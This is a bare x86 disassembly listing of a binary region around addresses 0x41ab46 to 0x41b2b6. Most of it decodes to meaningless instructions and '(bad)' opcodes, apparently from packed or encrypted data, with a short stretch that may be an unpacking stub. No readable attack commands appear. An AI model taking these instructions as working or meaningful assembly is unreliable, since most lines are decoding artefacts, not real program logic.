  41ab46:	xchg   ecx,eax
  41ab47:	mov    edx,0x570e752a
  41ab4c:	lds    edi,FWORD PTR [edi+0x69fb4e6a]
  41ab52:	gs and eax,0xf94d4b1a
  41ab58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab59:	dec    edx
  41ab5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab5b:	imul   edx,esi,0x3a415c77
  41ab61:	sbb    BYTE PTR [esi-0x2f],0x69
  41ab65:	mov    eax,ds:0x7598ca2f
  41ab6a:	in     al,dx
  41ab6b:	retf   0xb1bf
  41ab6e:	pop    ds
  41ab6f:	sbb    eax,0x242737b
  41ab74:	inc    ebx
  41ab75:	mov    al,0xe0
  41ab77:	or     eax,eax
  41ab79:	repnz push esi
  41ab7b:	inc    ebx
  41ab7c:	and    al,0x3e
  41ab7e:	ret    
  41ab7f:	test   eax,0x45230ff0
  41ab84:	je     0x41abe6
  41ab86:	cmp    bh,bl
  41ab88:	sahf   
  41ab89:	jbe    0x41ab27
  41ab8b:	test   DWORD PTR [ebp-0x746ef91a],edx
  41ab91:	jno    0x41abf2
  41ab93:	xor    ch,BYTE PTR [edx+0x3d]
  41ab96:	js     0x41ab4f
  41ab98:	pop    edx
  41ab99:	xchg   edi,eax
  41ab9a:	adc    cl,0xeb
  41ab9d:	aam    0xe9
  41ab9f:	mov    ds:0x67c31af2,al
  41aba4:	clc    
  41aba5:	scas   al,BYTE PTR es:[edi]
  41aba6:	push   edi
  41aba7:	xchg   edi,eax
  41aba8:	sub    eax,0x3a62359d
  41abad:	mov    esp,esp
  41abaf:	push   ecx
  41abb0:	stos   DWORD PTR es:[edi],eax
  41abb1:	jge    0x41abbe
  41abb3:	int    0x1d
  41abb5:	call   0x6e1e:0xf75d2f7d
  41abbc:	inc    edi
  41abbd:	add    dl,BYTE PTR [edx]
  41abbf:	shl    ah,1
  41abc1:	retf   0x782b
  41abc4:	retf   
  41abc5:	jne    0x41abcd
  41abc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abc8:	repz pusha 
  41abca:	xor    DWORD PTR [eax+0x3a],ecx
  41abcd:	out    dx,eax
  41abce:	dec    edi
  41abcf:	(bad)  
  41abd0:	and    DWORD PTR [ebp+0x6ffa906f],eax
  41abd6:	loopne 0x41abd2
  41abd8:	xchg   DWORD PTR [edx-0x50f49f6f],esp
  41abde:	pop    ss
  41abdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abe0:	and    esi,DWORD PTR [ebp-0x532d296f]
  41abe6:	jo     0x41ac17
  41abe8:	out    dx,al
  41abe9:	sbb    edi,esi
  41abeb:	gs adc edx,eax
  41abee:	mov    dh,0xfd
  41abf0:	fucomi st,st(5)
  41abf2:	ds lahf 
  41abf4:	mov    ds:0xc1537d04,al
  41abf9:	push   0x2a
  41abfb:	inc    eax
  41abfc:	push   cs
  41abfd:	sbb    ah,0x9a
  41ac00:	inc    eax
  41ac01:	pop    esi
  41ac02:	inc    esi
  41ac03:	pop    ecx
  41ac04:	sub    al,0xd
  41ac06:	mov    ebx,0x912953b4
  41ac0b:	add    BYTE PTR [edx-0xd33a5fd],dl
  41ac11:	rcl    DWORD PTR [edi],cl
  41ac13:	outs   dx,BYTE PTR ds:[esi]
  41ac14:	push   ebp
  41ac15:	add    BYTE PTR [esi-0x3a],0x67
  41ac19:	xchg   esp,eax
  41ac1a:	daa    
  41ac1b:	das    
  41ac1c:	lea    ebp,[ebp+0x61]
  41ac1f:	inc    edx
  41ac20:	in     al,dx
  41ac21:	xor    eax,0xe463b4a
  41ac26:	lods   al,BYTE PTR ds:[esi]
  41ac27:	dec    eax
  41ac28:	adc    edi,0xffffff88
  41ac2b:	cmp    dl,cl
  41ac2d:	mov    eax,ds:0x5d1eedfe
  41ac32:	jns    0x41ac6c
  41ac34:	fs jg  0x41ac28
  41ac37:	rol    BYTE PTR [eax-0x3ed6c698],1
  41ac3d:	and    cl,ah
  41ac3f:	sahf   
  41ac40:	addr16 (bad) 
  41ac42:	sub    eax,0x3b57f5cd
  41ac47:	popa   
  41ac48:	xor    eax,0x83928c8b
  41ac4d:	setg   BYTE PTR [edx]
  41ac50:	sbb    al,0x39
  41ac52:	std    
  41ac53:	mov    ds:0xc7f07d8b,al
  41ac58:	add    eax,0x42a31d
  41ac5d:	in     eax,dx
  41ac5e:	pop    ecx
  41ac5f:	add    BYTE PTR [eax],al
  41ac61:	sub    edi,edx
  41ac63:	mov    edx,DWORD PTR [ebp-0x4]
  41ac66:	add    DWORD PTR ds:0x42a2dd,0x42a3e9
  41ac70:	xor    edx,eax
  41ac72:	and    DWORD PTR ds:0x42a3ad,0x42a3a9
  41ac7c:	add    edx,ecx
  41ac7e:	mov    DWORD PTR ds:0x42a315,0x1963
  41ac88:	jmp    0x41b19a
  41ac8d:	int    0xca
  41ac8f:	enter  0xdbc8,0xda
  41ac93:	int    0xc9
  41ac95:	(bad)  
  41ac97:	stos   BYTE PTR es:[edi],al
  41ac98:	nop
  41ac99:	cmp    al,0xe2
  41ac9b:	cdq    
  41ac9c:	dec    ecx
  41ac9d:	pop    edx
  41ac9e:	xchg   BYTE PTR [edi+0x78],bh
  41aca1:	jae    0x41ad1f
  41aca3:	js     0x41ad1d
  41aca5:	jmp    0xb0f9:0x910d3579
  41acac:	push   ds
  41acad:	test   cl,ch
  41acaf:	lods   eax,DWORD PTR ds:[si]
  41acb1:	ror    DWORD PTR [edx+0x23466cff],cl
  41acb7:	and    ah,ch
  41acb9:	inc    ebx
  41acba:	mov    esp,0x1b95ebb6
  41acbf:	ret    0x23cc
  41acc2:	jae    0x41aca5
  41acc4:	in     al,dx
  41acc5:	jmp    0xc1af:0xdaaa7370
  41accc:	mov    bh,0xf
  41acce:	add    eax,0xa14cf7c6
  41acd3:	stos   BYTE PTR es:[edi],al
  41acd4:	jecxz  0x41ac58
  41acd6:	mov    eax,0xf4aa12c5
  41acdb:	jns    0x41acf7
  41acdd:	push   ecx
  41acde:	cmp    eax,0x939278c1
  41ace3:	std    
  41ace4:	mov    ?,WORD PTR [edx]
  41ace6:	jbe    0x41ac7e
  41ace8:	or     esp,eax
  41acea:	mov    dh,0x10
  41acec:	iret   
  41aced:	inc    ebp
  41acee:	or     DWORD PTR [edi],ebx
  41acf0:	into   
  41acf1:	test   bh,0xae
  41acf4:	add    BYTE PTR [ecx+0x2fc0c8f9],al
  41acfa:	addr16 dec ecx
  41acfc:	mov    al,ds:0xe99fe5a6
  41ad01:	and    esp,esp
  41ad03:	mov    ch,0x5c
  41ad05:	adc    al,0xc0
  41ad07:	(bad)  [ebx-0x73]
  41ad0a:	xchg   ecx,eax
  41ad0b:	gs (bad) 
  41ad0e:	fimul  DWORD PTR ds:0x2f4799
  41ad14:	out    0x34,eax
  41ad16:	hlt    
  41ad17:	jb     0x41acf4
  41ad19:	and    ch,BYTE PTR cs:[eax+ebp*4]
  41ad1d:	and    al,0x76
  41ad1f:	sbb    DWORD PTR [edi],edi
  41ad21:	mov    dl,0x4b
  41ad23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad24:	sub    al,0x2a
  41ad26:	loopne 0x41acad
  41ad28:	or     BYTE PTR fs:[ebx-0x2f],ch
  41ad2c:	loope  0x41ad88
  41ad2e:	les    esi,FWORD PTR [edx+0x3c]
  41ad31:	sbb    ch,BYTE PTR [ebp+0x12]
  41ad34:	into   
  41ad35:	jecxz  0x41acd0
  41ad37:	pop    esi
  41ad38:	push   es
  41ad39:	aad    0xd9
  41ad3b:	xlat   BYTE PTR ds:[ebx]
  41ad3c:	xchg   edx,eax
  41ad3d:	jmp    0x41ad6a
  41ad3f:	cwde   
  41ad40:	sbb    al,BYTE PTR [ecx-0x37c7e852]
  41ad46:	bound  ebx,QWORD PTR [esi-0x47]
  41ad49:	or     DWORD PTR [esi-0x456e6110],esp
  41ad4f:	into   
  41ad50:	les    esi,FWORD PTR [ebx]
  41ad52:	xchg   BYTE PTR [ebp-0x4cb422f7],al
  41ad58:	clc    
  41ad59:	xchg   cl,dh
  41ad5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad5d:	int3   
  41ad5e:	stos   BYTE PTR es:[edi],al
  41ad5f:	lock jns 0x41ad4c
  41ad62:	push   edx
  41ad63:	and    BYTE PTR [esi],bh
  41ad65:	lock jmp 0x8c5f:0xbe4b1ee1
  41ad6d:	std    
  41ad6e:	sahf   
  41ad6f:	push   edi
  41ad70:	add    al,0x3
  41ad72:	iret   
  41ad73:	mov    ?,edi
  41ad75:	aas    
  41ad76:	push   ebp
  41ad77:	and    al,BYTE PTR [edi+0x55656aa4]
  41ad7d:	sbb    esp,edi
  41ad7f:	mov    ah,0xe8
  41ad81:	inc    edi
  41ad82:	sub    ebp,eax
  41ad84:	outs   dx,DWORD PTR ds:[esi]
  41ad85:	cdq    
  41ad86:	jb     0x41adbb
  41ad88:	sbb    al,0x66
  41ad8a:	mov    edi,ebx
  41ad8c:	jle    0x41adc9
  41ad8e:	(bad)  
  41ad8f:	mov    ?,eax
  41ad91:	add    DWORD PTR [ebp+ebp*2+0x47f52bd3],0xffffff8a
  41ad99:	rol    ebx,cl
  41ad9b:	push   ecx
  41ad9c:	pop    edx
  41ad9d:	add    DWORD PTR [eax+0x3e2328d9],ecx
  41ada3:	test   DWORD PTR [di+0x7f63],esi
  41ada8:	push   edi
  41ada9:	test   BYTE PTR [edx+ebp*1+0x2cc0d75e],ah
  41adb0:	cwde   
  41adb1:	imul   ecx,DWORD PTR [edi+esi*8+0x7c],0x4e
  41adb6:	inc    edx
  41adb7:	mov    bh,0x58
  41adb9:	pop    eax
  41adba:	mov    esp,0xea6f35e2
  41adbf:	cs sub al,0xfd
  41adc2:	xor    al,0x62
  41adc4:	or     al,0xdb
  41adc6:	jbe    0x41ada1
  41adc8:	mul    cl
  41adca:	mov    dl,0x22
  41adcc:	pop    eax
  41adcd:	fisttp WORD PTR [ecx]
  41adcf:	test   DWORD PTR [esi-0x4d],ecx
  41add2:	repz add al,0xd5
  41add5:	in     eax,0x18
  41add7:	retf   
  41add8:	scas   al,BYTE PTR es:[edi]
  41add9:	ror    ebp,1
  41addb:	sbb    al,0x69
  41addd:	fisub  DWORD PTR [ecx+eiz*1+0x51055486]
  41ade4:	cmp    DWORD PTR [eax],0xde0d3
  41adea:	ins    BYTE PTR es:[di],dx
  41adec:	sahf   
  41aded:	pop    edi
  41adee:	mov    dl,dh
  41adf0:	bound  esi,QWORD PTR [esi]
  41adf2:	sbb    esp,edi
  41adf4:	es out dx,al
  41adf6:	inc    edi
  41adf7:	inc    edi
  41adf8:	cs inc ecx
  41adfa:	or     ebx,ebp
  41adfc:	pop    eax
  41adfd:	icebp  
  41adfe:	fld    QWORD PTR [edx]
  41ae00:	ffreep st(0)
  41ae02:	dec    BYTE PTR [eax+0x7832c0f6]
  41ae08:	push   edi
  41ae09:	out    0x4d,eax
  41ae0b:	enter  0xc649,0x1e
  41ae0f:	sbb    eax,0xb410f815
  41ae14:	and    eax,esi
  41ae16:	xchg   esp,eax
  41ae17:	stos   DWORD PTR es:[edi],eax
  41ae18:	les    esi,FWORD PTR [edx]
  41ae1a:	icebp  
  41ae1b:	xchg   BYTE PTR [edi-0x78],dh
  41ae1e:	and    BYTE PTR [ecx],ah
  41ae20:	in     eax,dx
  41ae21:	dec    eax
  41ae22:	dec    eax
  41ae23:	push   es
  41ae24:	and    al,0xde
  41ae26:	sub    DWORD PTR [edx],ebx
  41ae28:	(bad)  
  41ae29:	pop    ebp
  41ae2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae2b:	jne    0x41ae23
  41ae2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae2e:	aas    
  41ae2f:	js     0x41ae5e
  41ae31:	ror    BYTE PTR [edi-0xb2597f4],0xa5
  41ae38:	icebp  
  41ae39:	adc    DWORD PTR [eax+esi*4-0x5e],esi
  41ae3d:	xor    esi,DWORD PTR [eax]
  41ae3f:	hlt    
  41ae40:	ret    0x5d46
  41ae43:	cdq    
  41ae44:	out    dx,al
  41ae45:	dec    eax
  41ae46:	fild   WORD PTR [edi-0x51]
  41ae49:	fwait
  41ae4a:	ins    DWORD PTR es:[edi],dx
  41ae4b:	or     al,0x31
  41ae4d:	shr    BYTE PTR [ebx],1
  41ae4f:	fisubr DWORD PTR [esi+0x1c18e519]
  41ae55:	enter  0x770,0xb3
  41ae59:	test   esp,eax
  41ae5b:	pop    ecx
  41ae5c:	imul   DWORD PTR [edi+0x7fee3fe5]
  41ae62:	add    DWORD PTR [ebx+0x7b08a38d],0x7f
  41ae69:	mov    esi,0xe853bed2
  41ae6e:	push   ds
  41ae6f:	mov    ch,0x37
  41ae71:	fistp  DWORD PTR [ebx]
  41ae73:	hlt    
  41ae74:	sub    BYTE PTR [ebx+0x4bd7c0d5],al
  41ae7a:	test   BYTE PTR [edi],0x44
  41ae7d:	lahf   
  41ae7e:	mov    dl,dl
  41ae80:	cmp    bl,BYTE PTR [ebx+0x66]
  41ae83:	and    BYTE PTR [edx+0x6b],0x49
  41ae87:	mov    edx,0x5a822e6c
  41ae8c:	mov    edi,0xd9015b71
  41ae91:	jmp    0xa7bb:0x1bd3b32a
  41ae98:	jge    0x41aec2
  41ae9a:	cli    
  41ae9b:	fs mov ch,0x4a
  41ae9e:	call   FWORD PTR [edi]
  41aea0:	add    esp,DWORD PTR [eax+0x5c]
  41aea3:	lods   eax,DWORD PTR ds:[esi]
  41aea4:	jmp    0x104dcc3b
  41aea9:	out    0xdd,eax
  41aeab:	mov    cl,0xbe
  41aead:	stc    
  41aeae:	adc    edi,DWORD PTR [eax-0x44]
  41aeb1:	cmp    ah,BYTE PTR [edi+0x3d4cf72f]
  41aeb7:	and    BYTE PTR [esi],bh
  41aeb9:	push   0xd65a815e
  41aebe:	jge    0x41ae5b
  41aec0:	adc    al,0x35
  41aec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aec3:	cmp    al,0x40
  41aec5:	in     al,0x7c
  41aec7:	jmp    FWORD PTR [ecx+0x9]
  41aeca:	lods   al,BYTE PTR ds:[esi]
  41aecb:	sbb    eax,0xb00731d7
  41aed0:	xchg   DWORD PTR [ecx-0x794bc117],ebx
  41aed6:	or     cl,BYTE PTR [ebp+0x48d8c32]
  41aedc:	outs   dx,BYTE PTR ds:[esi]
  41aedd:	cmp    ah,BYTE PTR [ecx+0x35]
  41aee0:	retf   
  41aee1:	xor    DWORD PTR [ecx],esi
  41aee3:	sti    
  41aee4:	pop    edx
  41aee5:	or     bl,BYTE PTR [edx]
  41aee7:	neg    BYTE PTR [edi+0x1d5cc9b9]
  41aeed:	cmp    bl,dl
  41aeef:	cli    
  41aef0:	or     BYTE PTR [edi],bl
  41aef2:	cld    
  41aef3:	lods   eax,DWORD PTR ds:[esi]
  41aef4:	jo     0x41aeb6
  41aef6:	xor    DWORD PTR [ebp-0x3a6c27b],0xfffffff8
  41aefd:	shl    DWORD PTR [edi+0x10],0x6d
  41af01:	lahf   
  41af02:	xchg   ecx,eax
  41af03:	push   esp
  41af04:	leave  
  41af05:	cmp    DWORD PTR [edi],esi
  41af07:	xor    DWORD PTR [edi],0x64
  41af0a:	fld    DWORD PTR ds:0xabd28d30
  41af10:	mov    BYTE PTR [ebx-0xf5eab71],ch
  41af16:	sbb    eax,DWORD PTR [edi]
  41af18:	jnp    0x41aecf
  41af1a:	psllw  mm1,mm2
  41af1d:	adc    bh,BYTE PTR [eax]
  41af1f:	ins    BYTE PTR es:[edi],dx
  41af20:	and    ebx,DWORD PTR [edi]
  41af22:	cmp    esi,esp
  41af24:	xchg   ecx,eax
  41af25:	pop    edx
  41af26:	mov    WORD PTR [eax-0x7a30fee1],?
  41af2c:	and    bh,BYTE PTR [ecx-0x37ae1f7a]
  41af32:	jb     0x41aef5
  41af34:	add    al,0x8
  41af36:	not    BYTE PTR [edx]
  41af38:	int    0x21
  41af3a:	push   esp
  41af3b:	loopne 0x41af30
  41af3d:	retf   
  41af3e:	pop    edx
  41af3f:	push   ss
  41af40:	push   DWORD PTR [edx]
  41af42:	xchg   esi,eax
  41af43:	fmul   DWORD PTR [ebx+0x35]
  41af46:	fadd   QWORD PTR [esi]
  41af48:	lods   eax,DWORD PTR ds:[esi]
  41af49:	icebp  
  41af4a:	imul   ecx,DWORD PTR [edi],0x5f9c78e7
  41af50:	scas   eax,DWORD PTR es:[edi]
  41af51:	mov    ?,esp
  41af53:	mov    bh,BYTE PTR ds:[eax-0x195b58fd]
  41af5a:	pop    ds
  41af5b:	pushf  
  41af5c:	jmp    0xe21e28f1
  41af61:	xchg   DWORD PTR [ebx-0x5bbafbcb],esp
  41af67:	loop   0x41afce
  41af69:	stc    
  41af6a:	arpl   WORD PTR [esi-0x4b082e4d],di
  41af70:	into   
  41af71:	ins    DWORD PTR es:[edi],dx
  41af72:	call   0x56619ee1
  41af77:	and    DWORD PTR [ebp-0x71],0x78b4f497
  41af7e:	test   DWORD PTR [esi],edx
  41af80:	popf   
  41af81:	mov    esi,0x8471d055
  41af86:	test   al,0x12
  41af88:	jnp    0x41af64
  41af8a:	cmp    ch,BYTE PTR [ecx+0x5e]
  41af8d:	pop    ebp
  41af8e:	mov    al,0xe
  41af90:	es (bad) 
  41af92:	stos   BYTE PTR es:[edi],al
  41af93:	ja     0x41b008
  41af95:	div    DWORD PTR [ebx]
  41af97:	cmp    BYTE PTR [ebp-0x2ee79755],ah
  41af9d:	mov    esi,0xef18f291
  41afa2:	imul   ebp,DWORD PTR [edi-0xbf127dc],0x900f85ac
  41afac:	xchg   ecx,eax
  41afad:	mov    esi,0x2bcca798
  41afb2:	cli    
  41afb3:	out    0x81,eax
  41afb5:	fmul   DWORD PTR [edx+0x494e4c33]
  41afbb:	stos   BYTE PTR es:[edi],al
  41afbc:	bound  edi,QWORD PTR ds:0x86d4745f
  41afc2:	sub    BYTE PTR [ebp+0x6578725],0xaa
  41afc9:	lock xor eax,0x824a18e6
  41afcf:	xchg   ecx,eax
  41afd0:	rcl    BYTE PTR [edi+0x628dd77a],1
  41afd6:	dec    eax
  41afd7:	in     eax,dx
  41afd8:	mov    ebp,0x8f4ebd1a
  41afdd:	and    DWORD PTR [ecx],esp
  41afdf:	aad    0xc4
  41afe1:	fadd   DWORD PTR [ebp+0x20]
  41afe4:	push   ebp
  41afe5:	rcr    DWORD PTR [esi+0x78],0x5a
  41afe9:	xor    al,ah
  41afeb:	lea    ebx,[ebx]
  41afed:	adc    eax,0xe8bf59b3
  41aff2:	and    al,0xde
  41aff4:	imul   DWORD PTR [edi-0x39b11b6e]
  41affa:	mov    bh,0x5a
  41affc:	test   DWORD PTR [ecx],edx
  41affe:	dec    ebp
  41afff:	adc    edx,DWORD PTR [ebx]
  41b001:	inc    eax
  41b002:	ret    
  41b003:	or     DWORD PTR [ecx+0xc],edi
  41b006:	push   es
  41b007:	mov    al,0xc1
  41b009:	jl     0x41afd9
  41b00b:	sbb    DWORD PTR [eax-0x18],ecx
  41b00e:	xchg   BYTE PTR [ebx],cl
  41b010:	xchg   esp,eax
  41b011:	iret   
  41b012:	inc    esp
  41b013:	push   ecx
  41b014:	fld    TBYTE PTR [edi]
  41b016:	pop    ds
  41b017:	(bad)  
  41b018:	cs push esp
  41b01a:	pop    ebx
  41b01b:	mov    dl,0xad
  41b01d:	stos   DWORD PTR es:[edi],eax
  41b01e:	xchg   ecx,eax
  41b01f:	xchg   edi,eax
  41b020:	xchg   edi,eax
  41b021:	mov    ?,WORD PTR [ebp+0x5d]
  41b024:	mov    edx,0xdbdb71ea
  41b029:	xchg   edi,eax
  41b02a:	fcmovnbe st,st(1)
  41b02c:	cmc    
  41b02d:	repnz imul edi,DWORD PTR [di+0x5a],0x5d
  41b033:	mov    BYTE PTR [edi],0xc3
  41b036:	mov    ds:0x5de16083,eax
  41b03b:	pop    ss
  41b03c:	sbb    DWORD PTR [ebx+esi*4-0x34150002],edi
  41b043:	js     0x41afda
  41b045:	mov    ds:0x1dd70fd7,al
  41b04a:	sub    edi,ebp
  41b04c:	cmp    ah,BYTE PTR [edi]
  41b04e:	inc    edx
  41b04f:	shr    BYTE PTR [bx+di+0x711],cl
  41b054:	push   ds
  41b055:	cmp    bh,BYTE PTR [eax-0x5d]
  41b058:	(bad)  
  41b059:	ficom  WORD PTR [ebp-0x329e5878]
  41b05f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b060:	sahf   
  41b061:	inc    eax
  41b062:	arpl   WORD PTR [ebp+0x26],cx
  41b065:	adc    bl,cl
  41b067:	push   ebx
  41b068:	loopne 0x41b0e3
  41b06a:	daa    
  41b06b:	xor    ebx,DWORD PTR [esi+0x5a]
  41b06e:	jg     0x41b0e7
  41b070:	sahf   
  41b071:	fsubr  DWORD PTR [edi+edx*1+0x14]
  41b075:	fidiv  WORD PTR [edi-0x22b2b609]
  41b07b:	es das 
  41b07d:	ficom  DWORD PTR [esi]
  41b07f:	ss aaa 
  41b081:	add    eax,0x4cf1b806
  41b086:	in     al,dx
  41b087:	fnstenv [eax-0x149c452d]
  41b08d:	and    esi,ebx
  41b08f:	repz fisttp QWORD PTR [eax]
  41b092:	and    esp,esi
  41b094:	mov    edx,0x828b4c38
  41b099:	jp     0x41b052
  41b09b:	jge    0x41b11c
  41b09d:	inc    ecx
  41b09e:	ss aad 0xd5
  41b0a1:	or     eax,0x69eec86d
  41b0a6:	cmp    esp,esi
  41b0a8:	mov    esi,0x71d8978a
  41b0ad:	mov    edx,0xd9802049
  41b0b2:	inc    ebp
  41b0b3:	mov    BYTE PTR [edi+0x45],dh
  41b0b6:	fucomi st,st(1)
  41b0b8:	paddsw mm1,QWORD PTR [edx-0x6]
  41b0bc:	cdq    
  41b0bd:	pop    ebx
  41b0be:	test   eax,0x6e0c9a3a
  41b0c3:	cmp    BYTE PTR [esi],dl
  41b0c5:	sub    ebx,eax
  41b0c7:	(bad)  
  41b0c8:	cmp    eax,DWORD PTR [esi+edi*4]
  41b0cb:	adc    bh,BYTE PTR [ebx]
  41b0cd:	lods   eax,DWORD PTR ds:[esi]
  41b0ce:	lock push eax
  41b0d0:	jae    0x41b0b5
  41b0d2:	popf   
  41b0d3:	call   0x88f48d5a
  41b0d8:	inc    esp
  41b0d9:	in     eax,0xf9
  41b0db:	les    ebp,FWORD PTR [esi]
  41b0dd:	iret   
  41b0de:	mov    esp,0x2566675
  41b0e3:	imul   edi,DWORD PTR [esi+eiz*1+0x158337bb],0xffffff8c
  41b0eb:	mov    WORD PTR [edx],ds
  41b0ed:	mov    DWORD PTR [edi+0x2c98f4eb],ebp
  41b0f3:	sbb    ecx,DWORD PTR [eax+0x5a]
  41b0f6:	stos   BYTE PTR es:[edi],al
  41b0f7:	stos   BYTE PTR es:[edi],al
  41b0f8:	icebp  
  41b0f9:	fdiv   DWORD PTR [ebx-0x25]
  41b0fc:	push   0xfffffff3
  41b0fe:	shl    esp,1
  41b100:	sub    dh,BYTE PTR [esi+0x19]
  41b103:	icebp  
  41b104:	and    al,0x7b
  41b106:	fldcw  WORD PTR [esp+eiz*4]
  41b109:	mov    cl,0x31
  41b10b:	mov    esi,0xca918676
  41b110:	cld    
  41b111:	mov    esi,0xa04e8926
  41b116:	iret   
  41b117:	fwait
  41b118:	mov    ds:0x2b404425,al
  41b11d:	daa    
  41b11e:	xor    esp,eax
  41b120:	pop    ecx
  41b121:	cmp    al,0xe1
  41b123:	fbstp  TBYTE PTR [esi+0x650ac792]
  41b129:	(bad)  
  41b12a:	inc    edx
  41b12b:	fst    DWORD PTR [esi]
  41b12d:	lods   al,BYTE PTR ds:[esi]
  41b12e:	test   eax,0x1ad18f50
  41b133:	aas    
  41b134:	cmp    BYTE PTR [edx],0x7e
  41b137:	push   es
  41b138:	pop    esp
  41b139:	mov    ebx,0x1982746d
  41b13e:	mov    ah,0x5f
  41b140:	mov    ch,0x7c
  41b142:	retf   0x99fd
  41b145:	stc    
  41b146:	adc    al,BYTE PTR [ecx+ebp*1]
  41b149:	lods   eax,DWORD PTR ds:[esi]
  41b14a:	dec    ebp
  41b14b:	ss push 0x7c607998
  41b151:	inc    esi
  41b152:	cmp    dh,ch
  41b154:	mov    ah,0x48
  41b156:	jge    0x41b14e
  41b158:	inc    esp
  41b159:	mov    ds:0xec33dc04,eax
  41b15e:	jns    0x41b1b1
  41b160:	shl    ecx,cl
  41b162:	cmp    BYTE PTR [ebp-0x775bd7b3],0x6b
  41b169:	dec    DWORD PTR [ebp+0x1]
  41b16c:	xchg   ecx,eax
  41b16d:	adc    al,0x6b
  41b16f:	mov    al,ds:0x9830b580
  41b174:	cld    
  41b175:	mov    dl,0xec
  41b177:	sbb    edx,DWORD PTR [ebx+0xd]
  41b17a:	push   esp
  41b17b:	dec    ebx
  41b17c:	movntps XMMWORD PTR [edx+0x32],xmm6
  41b180:	pop    ds
  41b181:	xor    eax,0xc97f8416
  41b186:	pusha  
  41b187:	jno    0x41b16b
  41b189:	(bad)  
  41b18a:	es push ebx
  41b18c:	cld    
  41b18d:	enter  0x6258,0x54
  41b191:	fdivp  st(7),st
  41b193:	dec    esp
  41b194:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b195:	scas   al,BYTE PTR es:[edi]
  41b196:	cwde   
  41b197:	cmp    al,0x31
  41b199:	icebp  
  41b19a:	cmp    edi,edx
  41b19c:	jmp    0x41b6ae
  41b1a1:	(bad)
  41b1a4:	retf   0xdad9
  41b1a7:	leave  
  41b1a8:	shr    DWORD PTR [eax+0x14b5793a],cl
  41b1ae:	imul   esi,edi,0x7f894da6
  41b1b4:	js     0x41b229
  41b1b6:	jl     0x41b230
  41b1b8:	js     0x41b1f4
  41b1ba:	mov    esi,0xe75d04cc
  41b1bf:	ds in  eax,0x2c
  41b1c2:	sbb    al,0xd2
  41b1c4:	data16 ss arpl sp,ax
  41b1c8:	and    DWORD PTR [ecx],edx
  41b1ca:	xor    dl,BYTE PTR [ebx+edx*1-0xc5bd80a]
  41b1d1:	outs   dx,BYTE PTR ds:[esi]
  41b1d2:	push   0x49832390
  41b1d7:	mov    es,WORD PTR [esi]
  41b1d9:	push   ebx
  41b1da:	push   esi
  41b1db:	mov    ch,0x48
  41b1dd:	jp     0x41b1d0
  41b1df:	(bad)  
  41b1e1:	inc    esp
  41b1e2:	mov    eax,ds:0xd6144e89
  41b1e7:	xor    BYTE PTR [esi],ch
  41b1e9:	mov    esi,0x68ba2d55
  41b1ee:	inc    ecx
  41b1ef:	and    al,0xee
  41b1f1:	scas   al,BYTE PTR es:[edi]
  41b1f2:	lea    eax,[ebx-0x5a]
  41b1f5:	mov    ecx,0x859f4c34
  41b1fa:	add    esp,DWORD PTR [esi-0x65]
  41b1fd:	xlat   BYTE PTR ds:[ebx]
  41b1fe:	add    BYTE PTR [bp+di],ah
  41b201:	out    dx,al
  41b202:	dec    edi
  41b203:	push   esi
  41b204:	ret    0x9abe
  41b207:	mov    dl,0x71
  41b209:	xchg   ecx,eax
  41b20a:	xor    DWORD PTR [edi],ecx
  41b20c:	inc    ebp
  41b20d:	test   al,0x44
  41b20f:	fnstenv [ebx-0x1f]
  41b212:	mov    ebx,0xddf77e58
  41b217:	int3   
  41b218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b219:	mov    ch,0xb6
  41b21b:	mov    ebx,0x3e2b9b73
  41b220:	mov    al,0xd4
  41b222:	or     BYTE PTR [ebx+0x4e60d15c],cl
  41b228:	jb     0x41b23d
  41b22a:	jne    0x41b29f
  41b22c:	pop    ss
  41b22d:	das    
  41b22e:	test   al,0xd5
  41b230:	hlt    
  41b231:	mov    eax,0x66be0e39
  41b236:	mov    esi,0xfa948491
  41b23b:	ror    dh,cl
  41b23d:	leave  
  41b23e:	dec    edx
  41b23f:	mov    ah,0xe
  41b241:	adc    ch,BYTE PTR [ebx]
  41b243:	retf   
  41b244:	fadd   DWORD PTR [eax+0x2b6dd9a9]
  41b24a:	xlat   BYTE PTR ds:[ebx]
  41b24b:	inc    eax
  41b24c:	dec    ecx
  41b24d:	mov    gs,WORD PTR [eax+eax*1-0xc2e804b]
  41b254:	call   0xfaea:0x4d7a9832
  41b25b:	or     esp,DWORD PTR [esi-0x14]
  41b25e:	and    al,0xdb
  41b260:	mov    eax,ds:0xedb2e0e6
  41b265:	call   0xccc1:0x6fbd501d
  41b26c:	cwde   
  41b26d:	sub    edx,DWORD PTR [ebx]
  41b26f:	pop    esi
  41b270:	xor    bl,BYTE PTR cs:[ebx+eax*2-0x4c]
  41b275:	fsubr  DWORD PTR [edi-0x7c]
  41b278:	imul   ebp,eax,0x29
  41b27b:	cmp    BYTE PTR [edi],ch
  41b27d:	bound  di,DWORD PTR [edi+ebp*1]
  41b281:	jae    0x41b226
  41b283:	and    al,0x20
  41b285:	fsub   QWORD PTR [ecx+0x11]
  41b288:	add    al,0x20
  41b28a:	inc    esp
  41b28b:	pop    ds
  41b28c:	aam    0x39
  41b28e:	pop    ebx
  41b28f:	or     BYTE PTR [edi-0x26666ccb],dh
  41b295:	add    ch,dh
  41b297:	adc    DWORD PTR [edi],esp
  41b299:	ss or  ecx,edi
  41b29c:	mov    DWORD PTR [ebp+eax*8-0x4abb1762],ecx
  41b2a3:	lods   eax,DWORD PTR ds:[esi]
  41b2a4:	sub    eax,0x8dbb00f0
  41b2a9:	into   
  41b2aa:	fild   WORD PTR [ebx+ecx*1]
  41b2ad:	in     eax,dx
  41b2ae:	xor    BYTE PTR [edx-0x25c6d644],bh
  41b2b4:	sub    edx,esp
  41b2b6:	in     al,0x6a
